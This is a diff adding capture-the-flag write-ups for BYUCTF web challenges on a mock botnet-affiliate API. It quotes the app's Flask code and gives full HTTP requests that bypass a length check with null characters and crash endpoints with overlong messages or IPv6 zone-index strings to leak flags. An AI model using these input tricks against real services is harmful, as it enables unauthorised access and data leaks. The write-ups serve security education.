@@ -463,6 +463,451 @@ We got the flag!
 Flag : **byuctf{oof_remember_to_check_length_limit}**
 
 
+## urmombotnetdotnet.com - 3
+
+Value : **390pts**
+
+Difficulty : **Medium**
+
+Description :
+
+```
+During my databases class, my group and I decided we'd create a web app with the domain urmombotnetdotnet.com, and wrote the relevant code. At first glance, it looks pretty good! I'd say we were pretty thorough. But were we thorough enough??
+
+Oh... we also forgot to make the front end :)
+
+`byuctf.xyz:40010`
+
+---
+
+What is flag 3? (see `byuctf{fakeflag3}` in source)
+
+(see source from first chall)
+```
+
+### Solution
+
+First we need to look again where is our Fake Flag 3 once again. It is located again at ```app/tickets_routes.py```.
+
+```js
+# POST add a message to a ticket
+@app.route('/api/tickets/<int:ticket_id>', methods=['POST'])
+@token_required
+def post_add_message(session_data, ticket_id):
+    # get user_id from ticket_id
+    cur = mysql.connection.cursor()
+    cur.execute("SELECT user_id, message FROM support_tickets WHERE ticket_id=%s", (ticket_id,))
+    response = cur.fetchone()
+    cur.close()
+
+    if not response and session_data['is_staff']:
+        return jsonify({'message': 'Ticket not found'}), 404
+    
+    if not response or session_data['user_id'] != response[0]:
+        return jsonify({'message': 'You do not have permission to access this information'}), 403
+
+    # ensure needed parameters are present
+    if (request.json is None) or ('message' not in request.json):
+        return jsonify({'message': 'Missing required parameters'}), 400
+    
+    message = request.json['message']
+
+    # ensure parameters are integers
+    if type(message) is not str:
+        return jsonify({'message': 'Invalid parameter data'}), 400
+    # byuctf{fakeflag3}
+    # insert message into database
+    cur = mysql.connection.cursor()
+    new_message = response[1] + "\n" + message
+    cur.execute("UPDATE Support_Tickets SET message=%s WHERE ticket_id=%s", (new_message, ticket_id))
+    mysql.connection.commit()
+    cur.close()
+    
+    response = {"ticket_id": ticket_id, "message": message}
+
+    return jsonify(response), 200
+```
+
+So looking at the code, we can see that it's a POST request against ```/api/tickets/<int:ticket_id>```.
+
+This POST request can use the parameter ```message``` to add a message to the previously created ticket. Based on the comment it will :
+
+```
+# Make a POST request against /api/tickets/1 if your ticket id is "1"
+1. Ensure that the parameter "message" is present.
+2. Ensure that the parameters are integers
+3. Insert the message into the database
+```
+
+But as we can see, once again it doesnt look for the maximum Length of the new message added, so if we send a big amount of character as ```message``` parameter, it should crash.
+
+Let's try to generate a new message first.
+
+> Note : In my case it will be 1 because i've restarted the docker after the 2nd challenge, in your case it should be id 2 or whatever.
+
+```js
+POST /api/tickets HTTP/1.1
+Host: 127.0.0.1:40010
+...
+Content-Type: application/json
+Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJpc19zdGFmZiI6ZmFsc2V9.G7eNHWV71md6EUPEm9cKqnkbAjN2oV30dJGWO7bUSJM
+
+{
+		"description":"Give_me_my_flag"
+}
+```
+
+![9-NewTicket](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/0ef23136-d074-4395-8220-0319e57e8e4f)
+
+Now, how to verify that our ticket is created? We can look at the begining of the ```app/tickets_routes.py``` code, where we can see a GET request against the same endpoint than the message POST request ```/api/tickets/1```.
+
+```js
+# GET ticket information
+@app.route('/api/tickets/<int:ticket_id>', methods=['GET'])
+@token_required
+def get_ticket(session_data, ticket_id):
+    # get user_id from ticket_id
+    cur = mysql.connection.cursor()
+    cur.execute("SELECT user_id, description, messages FROM Support_Tickets WHERE ticket_id=%s", (ticket_id,))
+    response = cur.fetchone()
+    cur.close()
+
+    if not response and session_data['is_staff']:
+        return jsonify({'message': 'Ticket not found'}), 404
+    
+    if not response or session_data['user_id'] != response[0]:
+        return jsonify({'message': 'You do not have permission to access this information'}), 403
+
+    response = {"ticket_id": ticket_id, "user_id": response[0], "description": response[1], "messages":response[2]}
+    
+    return jsonify(response), 200
+```
+
+Make the GET request against ```/api/tickets/1``` to see the ticket.
+
+```js
+GET /api/tickets/1 HTTP/1.1
+Host: 127.0.0.1:40010
+...
+Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJpc19zdGFmZiI6ZmFsc2V9.G7eNHWV71md6EUPEm9cKqnkbAjN2oV30dJGWO7bUSJM
+```
+
+![10-OurTicket](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/04caa371-f17e-4747-843a-8af87a80e9a4)
+
+Now let's try to add a message to it with a POST request.
+
+```js
+POST /api/tickets/1 HTTP/1.1
+Host: 127.0.0.1:40010
+...
+Content-Type: application/json
+Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJpc19zdGFmZiI6ZmFsc2V9.G7eNHWV71md6EUPEm9cKqnkbAjN2oV30dJGWO7bUSJM
+
+{
+	"message":"Lorem ipsum"
+}
+```
+
+![11-LoremIpsumMessage](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/782708c2-53d4-493d-8776-5b1366c2b5db)
+
+Now we will make the GET request again to verify that our message has been added.
+
+```js
+GET /api/tickets/1 HTTP/1.1
+Host: 127.0.0.1:40010
+...
+Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJpc19zdGFmZiI6ZmFsc2V9.G7eNHWV71md6EUPEm9cKqnkbAjN2oV30dJGWO7bUSJM
+```
+
+![12-MessageAdded](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/f7109166-7a34-43ad-a0da-0bc4ae5e07ac)
+
+Now let's generate our bunch of characters with Python.
+
+```bash
+$ python3 -c 'print("B"*2500)'
+BBBBBBBBBBBBBBBBBBBBBBBBBBBBBB...
+```
+
+And we make it crash.
+
+```js
+POST /api/tickets/1 HTTP/1.1
+Host: 127.0.0.1:40010
+...
+Content-Type: application/json
+Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJpc19zdGFmZiI6ZmFsc2V9.G7eNHWV71md6EUPEm9cKqnkbAjN2oV30dJGWO7bUSJM
+
+{
+	"message":"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBB..."
+}
+```
+
+![13-crash](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/349c039a-e17b-48da-9d69-eef293f0227a)
+
+
+Great! We managed to cause the crash and get a source code leak. Now let's look at the RAW output of BurpSuit result window and look for the flag.
+
+![14-Flag_3](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/fd9d2328-2b98-4698-b017-5267d2339c25)
+
+FLAG : **byuctf{let&#39;s_not_even_talk_about_the_newline_injection...}**
+
+Which should be replaced to 
+
+FLAG : **byuctf{let's_not_even_talk_about_the_newline_injection...}**
+
+## urmombotnetdotnet.com - 4
+
+Value : **483pts**
+
+Difficulty : **Hard**
+
+Description :
+
+```
+During my databases class, my group and I decided we'd create a web app with the domain urmombotnetdotnet.com, and wrote the relevant code. At first glance, it looks pretty good! I'd say we were pretty thorough. But were we thorough enough??
+
+Oh... we also forgot to make the front end :)
+
+`byuctf.xyz:40010`
+
+---
+
+What is flag 4? (see `byuctf{fakeflag4}` in source)
+
+(see source from first chall)
+```
+
+### Solution
+
+First we need to find the 4th fake flag. And as we remember, we found it at the end of ```/app/login_routes.py``` at the challenge 2.
+
+```js
+    # generate JWT
+    token = jwt.encode({'user_id': user_id, "is_staff": is_staff}, app.config['SECRET_KEY'], algorithm='HS256')
+
+    resp = make_response(jsonify({'message': 'Successfully logged in', 'flag':('byuctf{fakeflag4}' if len(username) < 4 else 'Nope')}), 200)
+    resp.set_cookie('token', token, httponly=True, samesite='Strict', max_age=None)
+```
+
+As we can see, the flag will be returned if our username length is less than 4 characters. So let's take a look again at the register part of the code.
+
+```js
+    # ensure username is valid
+    if len(username) < 4 or len(username) > 255:
+        return jsonify({'message': 'Invalid username length'}), 400
+    
+    # ensure username isn't already taken
+    cur = mysql.connection.cursor()
+    cur.execute("SELECT username FROM User WHERE username=%s", (username,))
+    users_found = cur.rowcount
+    cur.close()
+    username_taken = (users_found > 0)
+
+    if username_taken:
+        return jsonify({'message': 'Username already taken'}), 500
+```
+
+As we can see, this time, it look for the lenght limit of the username, we cant make an username of less than 4 characters and maximum 255 characters.
+
+So how can we login as a username of less than 4 characters?
+
+By using Unicode Null characters, we can register an account of less than 4 characters because the Null characters will be ignored.
+
+This mean that ```\u0000b\u0000i\u0000m``` will be interpreted as ```bim```.
+
+> Some cool ressource about null character (not obligatory unicode) here 
+> Source : https://owasp.org/www-community/attacks/Embedding_Null_Code
+
+So let's register again a ```bim``` user using unicode null characters in the ```/api/register``` endpoint.
+
+```js
+POST /api/register HTTP/1.1
+Host: 127.0.0.1:40010
+...
+Content-Type: application/json
+
+{
+    "email":"bim@bam.boom",
+    "username":"\u0000b\u0000i\u0000m",
+    "password":"SuperPassword",
+    "bitcoin_wallet":"0x74b5785F8bB5B053A7b6B7490C8Af8FDef880d03"
+}
+```
+
+![15-RegisterBim](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/6bcbe0cb-cdc5-4f82-baaa-edfbe9c9a99b)
+
+
+Great, now that our user ```\u000b\u000i\u000m``` let's login as ```bim``` on the ```/api/login``` endpoint.
+
+```js
+POST /api/login HTTP/1.1
+Host: 127.0.0.1:40010
+...
+Content-Type: application/json
+
+{
+    "username":"bim",
+    "password":"SuperPassword"
+}
+```
+
+![16-Flag_4](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/8b19d43f-8a32-4309-96a5-b53e7837bb01)
+
+We got the flag! 
+
+Flag : **byuctf{I_used_unicode_to_make_a_username_under_4_chars_wbu?}**
+
+## urmombotnetdotnet.com - 5
+
+Value : **439pts**
+
+Difficulty : **Hard**
+
+Description :
+
+```
+During my databases class, my group and I decided we'd create a web app with the domain urmombotnetdotnet.com, and wrote the relevant code. At first glance, it looks pretty good! I'd say we were pretty thorough. But were we thorough enough??
+
+Oh... we also forgot to make the front end :)
+
+`byuctf.xyz:40010`
+
+---
+
+What is flag 5? (see `byuctf{fakeflag5}` in source)
+
+(see source from first chall)
+```
+
+### Solution
+
+First we neet to look at where is the 5th and last fake flag. It is located at ```/app/account_routes.py```.
+
+```js
+# POST add a bot as an affiliate
+@app.route('/api/bots', methods=['POST'])
+@token_required
+def post_add_bot(session_data):
+    # ensure needed parameters are present
+    if (request.json is None) or ('os' not in request.json) or ('ip_address' not in request.json):
+        return jsonify({'message': 'Missing required parameters'}), 400
+    
+    os = request.json['os']
+    ip_address = request.json['ip_address']
+    user_id = session_data["user_id"]
+
+    # ensure parameters are strings
+    if type(os) is not str or type(ip_address) is not str:
+        return jsonify({'message': 'Invalid parameter data'}), 400
+    
+    # validate os
+    if os not in ['Windows', 'Linux', 'MacOS']:
+        return jsonify({'message': 'Invalid OS'}), 400
+    
+    # validate ip_address
+    try:
+        ipaddress.ip_address(ip_address)
+    except ValueError:
+        return jsonify({'message': 'Invalid IP address'}), 400
+    
+    # see if IP address is already added
+    cur = mysql.connection.cursor()
+    cur.execute("SELECT bot_id FROM Bots WHERE ip_address=%s", (ip_address,))
+    response = cur.fetchone()
+    if response:
+        return jsonify({'message': 'IP address already added'}), 400
+
+    
+    # select affiliate id from user id
+    cur.execute("SELECT affiliate_id, Total_bots_added, money_received FROM Affiliates WHERE user_id=%s", (user_id,))
+    result = cur.fetchone()
+    affiliate_id = result[0]
+    old_total_bots_added = result[1]
+    old_money_received = result[2]
+    # byuctf{fakeflag5}
+    # add bot to database
+    cur.execute("INSERT INTO Bots (os, ip_address) VALUES (%s, %s)", (os, ip_address))
+    mysql.connection.commit()
+    bot_id = cur.lastrowid
+    cur.execute("INSERT INTO Adds VALUES (%s, %s)", (bot_id, affiliate_id))
+
+    # update affiliate information
+    cur.execute("UPDATE Affiliates SET total_bots_added=%s, money_received=%s WHERE affiliate_id=%s", (old_total_bots_added+1, old_money_received+(BOT_PRICE_LINUX_WINDOWS if os!='MacOS' else BOT_PRICE_MACOS), affiliate_id))
+    mysql.connection.commit()
+    cur.close()
+
+    response = {"bot_id": bot_id, "payment": BOT_PRICE_LINUX_WINDOWS if os!='MacOS' else BOT_PRICE_MACOS}
+    
+    return jsonify(response), 200
+```
+
+This is a POST request against ```/api/bots``` endpoint. It do the following :
+
+```
+1. It ensure the needed parameter are present, which are, "os" and "ip_address" and also the token of course.
+2. It ensure that parameters are strings
+3. It validate the "os" parameter which should be "Windows", "Linux" or "MacOS".
+4. It validate the ip_address at putting the value through "ipaddress.ip_adress(ip_address)" from the ipaddress python library.
+5. It look in the db if the IP address is already added.
+6. It select the affiliate id in the database from the user id.
+7. It update the affiliate information
+8. Finally it return the created bot id and payment.
+```
+
+Now what is interesting, is that our ip is put into ```ipaddress.ip_address(ip_address)``` and if any error occure, it will stop earlier.
+
+We can put maximum 256 characters as ip_address. So if we can send more than 256 chracters we should get an error.
+
+Now we need to think, how to send an ip address with 256 characters? And we can do this with IPv6 with scope zone index using the character ```%``` as delimiter.
+
+Source : https://en.wikipedia.org/wiki/IPv6_address#Scoped_literal_IPv6_addresses_(with_zone_index)
+
+Now let's try to create a bot first to be sure of our normal request.
+
+```js
+POST /api/bots HTTP/1.1
+Host: 127.0.0.1:40010
+...
+Content-Type: application/json
+Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJpc19zdGFmZiI6ZmFsc2V9.G7eNHWV71md6EUPEm9cKqnkbAjN2oV30dJGWO7bUSJM
+Content-Length: 47
+
+{
+	"os":"Linux",
+	"ip_address":"0.0.0.0"
+}
+```
+
+![17-CreateBot](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/e077fc1a-3472-401e-8cad-95d48a115a6e)
+
+Great, now let's try to create a new bot but with an ipv6 using a scope zone index of a big random strings of characters.
+
+```js
+POST /api/bots HTTP/1.1
+Host: 127.0.0.1:40010
+...
+Content-Type: application/json
+Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJpc19zdGFmZiI6ZmFsc2V9.G7eNHWV71md6EUPEm9cKqnkbAjN2oV30dJGWO7bUSJM
+Content-Length: 174
+
+{
+	"os":"Linux",
+	"ip_address":"fe80::1ff:fe23:4567:890a%3thisismysuperipv6addressandihopetoretrievetheflagbythiswaysoiwritesomeshittomakeitmorefunsincethecrashoccure"
+}
+
+```
+
+![18-Crash](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/f8767cf2-cc86-4073-b252-446d66ba5cbc)
+
+We managed to make it crash! Now let's look for our flag into the RAW output of the result window in Burp Suite.
+
+![19-Flag_5](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/3b39c884-dd1c-424f-96f1-1eb498abbd6a)
+
+And we got the flag!
+
+Flag : **byuctf{IPv6_scopes_are_just_arbitrary_strings...maybe_there_are_more_vulns_worldwide?}**
+
+
 ## Pentesting<a name="Pentest"></a>
 
 ## Mi6configuration - 1<a name="Mi6-1"></a>
